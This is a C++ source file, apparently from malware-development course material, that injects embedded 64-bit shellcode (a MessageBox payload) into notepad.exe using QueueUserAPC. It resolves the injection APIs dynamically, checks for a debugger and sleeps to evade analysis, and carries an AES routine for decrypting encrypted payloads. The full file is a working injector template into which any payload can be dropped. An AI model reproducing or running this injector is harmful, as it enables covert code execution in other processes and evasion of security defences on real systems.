#include <iostream>
#include <stdlib.h>
#include <windows.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <string>

// MessageBox shellcode - 64-bit (exitfunc = thread)
//         - >> Hello World ! <<
//              UNENCRYPTED
unsigned char shellcode[] =
"\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

SIZE_T scSize = sizeof(shellcode);

typedef BOOL(WINAPI* pfnWriteProcessMemory)(
    IN  HANDLE  hProcess,
    IN  LPVOID  lpBaseAddress,
    IN  LPCVOID lpBuffer,
    IN  SIZE_T  nSize,
    OUT SIZE_T* lpNumberOfBytesWritten
    );

typedef LPVOID(WINAPI* pfnVirtualAllocEx)(
    IN           HANDLE hProcess,
    IN OPTIONAL  LPVOID lpAddress,
    IN           SIZE_T dwSize,
    IN           DWORD  flAllocationType,
    IN           DWORD  flProtect
    );

typedef DWORD(WINAPI* pfnQueueUserAPC)(
    IN PAPCFUNC  pfnAPC,
    IN HANDLE    hThread,
    IN ULONG_PTR dwData
    );

typedef DWORD(WINAPI* pfnWaitForSingleObjectEx)(
        IN HANDLE hHandle,
        IN DWORD  dwMilliseconds,
        IN BOOL   bAlertable
    );



// https://stackoverflow.com/a/55030118
DWORD FindProcessId(const std::wstring& processName)
{
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);
    DWORD pid = 0;


    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;

    Process32First(processesSnapshot, &processInfo);
    if (!processName.compare(processInfo.szExeFile))
    {
        CloseHandle(processesSnapshot);
        pid = processInfo.th32ProcessID;
    }

    while (Process32Next(processesSnapshot, &processInfo))
    {
        if (!processName.compare(processInfo.szExeFile))
        {
            CloseHandle(processesSnapshot);
            pid = processInfo.th32ProcessID;
        }
    }

    CloseHandle(processesSnapshot);
    return pid;
}

DWORD FindThread(DWORD pid) {

    // Init THREADENTRY structure and get size of it
    THREADENTRY32 threadInfo;
    threadInfo.dwSize = sizeof(threadInfo);

    // Handles and thread id vars
    HANDLE thSnap;

    DWORD thID = NULL;
    HANDLE tHandle = NULL;

    // Take snapshot of threads
    thSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
    if (thSnap == INVALID_HANDLE_VALUE) {
        printf("[-] Snapshot of system threads failed [ %d ]\n", GetLastError());
        return 0;
    }

    // Match PID with found thread ID, break if it does
    while (Thread32Next(thSnap, &threadInfo)) {
        if (threadInfo.th32OwnerProcessID == pid) {
            thID = threadInfo.th32ThreadID;
            break;
        }
    }

    CloseHandle(thSnap);
    return thID;
}

// RTO Mal Dev course
int AESDecrypt(unsigned char* payload, DWORD payload_len, char* key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    BOOL CryptAcquire = CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    if (CryptAcquire == false) {
        //printf("CryptAcquireContextW Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL CryptCreate = CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    if (CryptCreate == false) {
        //printf("CryptCreateHash Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL CryptHash = CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0);
    if (CryptHash == false) {
        //printf("CryptHashData Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL CryptDerive = CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    if (CryptDerive == false) {
        //printf("CryptDeriveKey Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL Crypt_Decrypt = CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, payload, &payload_len);
    if (Crypt_Decrypt == false) {
        //printf("CryptDecrypt Failed: %d\n", GetLastError());
        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}

int iQueueAPC(HANDLE pHandle, DWORD pID, unsigned char* payload, SIZE_T scSize) {
    
    // ------------------------------------------------------------------------------------------------------------
    pfnVirtualAllocEx pVirtualAllocEx = (pfnVirtualAllocEx)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "VirtualAllocEx");
    if (pVirtualAllocEx == NULL) {
        printf("[-] VirtualAllocEx [KERNL32] Failed     ->      [ %p ] [ %d ]\n", pVirtualAllocEx, GetLastError());
        return -2;
    }
    printf("[*] VirtualAllocEx [KERNEL32] Address       ->      [ %p ]\n", pVirtualAllocEx);

    pfnWriteProcessMemory pWriteProcessMemory = (pfnWriteProcessMemory)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "WriteProcessMemory");
    if (pWriteProcessMemory == NULL) {
        printf("[-] WriteProcessMemory [KERNEL32] Failed     ->      [ %p ] [ %d ]\n", pWriteProcessMemory, GetLastError());
        return -2;
    }
    printf("[*] WriteProcessMemory [KERNEL32] Address     ->      [ %p ]\n", pWriteProcessMemory);

    pfnQueueUserAPC pQueueUserAPC = (pfnQueueUserAPC)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "QueueUserAPC");
    if (pQueueUserAPC == NULL) {
        printf("[-] QueueUserAPC [KERNEL32] Failed     ->      [ %p ] [ %d ]\n", pQueueUserAPC, GetLastError());
        return -2;
    }
    printf("[*] QueueUserAPC [KERNEL32] Address       ->      [ %p ]\n", pQueueUserAPC);

    pfnWaitForSingleObjectEx pWaitForSingleObjectEx = (pfnWaitForSingleObjectEx)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "WaitForSingleObjectEx");
    if (pQueueUserAPC == NULL) {
        printf("[-] QueueUserAPC [KERNEL32] Failed     ->      [ %p ] [ %d ]\n", pWaitForSingleObjectEx, GetLastError());
        return -2;
    }
    printf("[*] QueueUserAPC [KERNEL32] Address       ->      [ %p ]\n", pWaitForSingleObjectEx);
    // ------------------------------------------------------------------------------------------------------------

    SIZE_T bytesWritten;
    HANDLE tHandle = NULL;
    DWORD timer = 2000; //milliseconds

    char pcName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD pcNameLength = sizeof(pcName);

    if (IsDebuggerPresent() == TRUE) {
        return -3;
    }
    else {
        if (!GetComputerNameA(pcName, &pcNameLength)) {
            return -3;
        }
        printf("[SUCCESS] Computer Name   ->   [ %s ]\n", pcName);
        printf("[INFO] Sleeping for %d\n", timer);
        SleepEx(timer, FALSE);
    }

    DWORD tID = FindThread(pID);
    if (!tID) {
        printf("[-] Obtaining Thread ID Failed for Process [ %d ]\nError [ %d ]\n", pID, GetLastError());
        return - 1;
    }

    tHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, tID);
    if (tHandle == INVALID_HANDLE_VALUE) {
        return -1;
    }
    printf("[+] Thread obtained [ %p ]\n", tHandle);

    LPVOID rAlloc = pVirtualAllocEx(pHandle, NULL, scSize, MEM_COMMIT, PAGE_READWRITE);
    if (!rAlloc) {
        printf("[-] Memory Not Allocated [ %d ]\n", GetLastError());
        return -1;
    }

    if (!pWriteProcessMemory(pHandle, rAlloc, payload, scSize, &bytesWritten)) {
        printf("[-] Write memory Failed [ %d ]\n", GetLastError());
        return -1;
    }

    DWORD oldP;
    if (!VirtualProtectEx(pHandle, rAlloc, scSize, PAGE_EXECUTE_READ, &oldP)) {
        printf("VirtualProtect Failed !");
        return -3;
    }

    DWORD qAPC = pQueueUserAPC((PAPCFUNC)rAlloc, tHandle, NULL);
    if (qAPC != 0) {
        printf("[+] APC Succeeded [ %d ]\n", qAPC);
        pWaitForSingleObjectEx(tHandle, INFINITE, FALSE);
    }
    else {
        printf("[-] APC Failed [ %d ]\n", qAPC);
        return -1;
    }

    CloseHandle(tHandle);
    return 0;
}

int main() {
    
    HANDLE pHandle = NULL;
    int iqAPC = NULL;

    DWORD pID = FindProcessId(L"notepad.exe");

    pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pID);
    if (!pHandle) {
        printf("[-] Handle to Process [ %d ] Failed !\n", pID);
        return -1;
    }
    else {
        iQueueAPC(pHandle, pID, shellcode, scSize);
        CloseHandle(pHandle);
    }

    return 0;
}